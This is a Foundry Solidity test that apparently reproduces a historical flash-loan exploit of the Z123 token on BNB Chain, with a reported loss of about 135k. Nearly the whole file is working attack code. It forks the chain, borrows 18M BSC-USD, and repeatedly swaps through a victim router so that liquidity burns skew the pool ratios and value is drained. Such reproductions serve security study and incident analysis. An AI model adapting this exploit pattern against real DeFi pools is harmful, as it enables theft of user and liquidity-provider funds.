import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ≈135k
// Attacker : 0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32
// Attack Contract : https://bscscan.com/address/0x61dd07ce0cecf0d7bacf5eb208c57d16bbdee168
// Vulnerable Contract : https://bscscan.com/address/0xb000f121A173D7Dd638bb080fEe669a2F3Af9760
// Attack Tx : https://bscscan.com/tx/0xc0c4e99a76da80a4cf43d3110364840151226c0a197c1728bb60dc3f1b3a6a27

// @Analysis
//
// First, tokens are exchanged from a pool with normal ratios using USD. 
// Then, each subsequent swap burns liquidity from the pool, resulting in disproportionate token ratios that can be exploited for arbitrage.

contract Z123_exp is Test {
    IERC20 z123_ = IERC20(0xb000f121A173D7Dd638bb080fEe669a2F3Af9760); 
    IPancakeV3Pool pancakeV3_ = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IERC20 bsc_usd_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter router_ = IPancakeRouter(payable(address(0x901c0967DF19fA0Af98Fd958E70F30301d7580dD)));
    IPancakeRouter victim_ = IPancakeRouter(payable(address(0x6125c643a2D4A927ACd63C1185c6be902eFd5dC8)));
    
    function setUp() public {
        vm.createSelectFork("bsc", 38_077_210);

        bsc_usd_.approve(address(router_), type(uint256).max);
        z123_.approve(address(router_), type(uint256).max);

        bsc_usd_.approve(address(victim_), type(uint256).max);
        z123_.approve(address(victim_), type(uint256).max);
        
    }

    function testExploit() public {
        emit log_named_decimal_uint("befor ack usdc balance = ", bsc_usd_.balanceOf(address(this)), bsc_usd_.decimals());
        pancakeV3_.flash(address(this), 18_000_000 ether, 0, "");
        emit log_named_decimal_uint("after profit usdc balance = ", bsc_usd_.balanceOf(address(this)), bsc_usd_.decimals());

    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public{
        address[] memory path = new address[](2);
        path[0] = address(bsc_usd_);
        path[1] = address(z123_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(18_000_000 ether, 1, path, address(this), block.timestamp);

        console.log("==== start attack====");
        path[0] = address(z123_);
        path[1] = address(bsc_usd_);
        for(int i = 0; i < 79; i++){
            victim_.swapExactTokensForTokensSupportingFeeOnTransferTokens(7125 ether, 1, path, address(this), block.timestamp);
        }
        console.log("==== end attack====");

        //repay
        bsc_usd_.transfer(address(pancakeV3_), 18_000_000 ether + fee0);
    }
}
        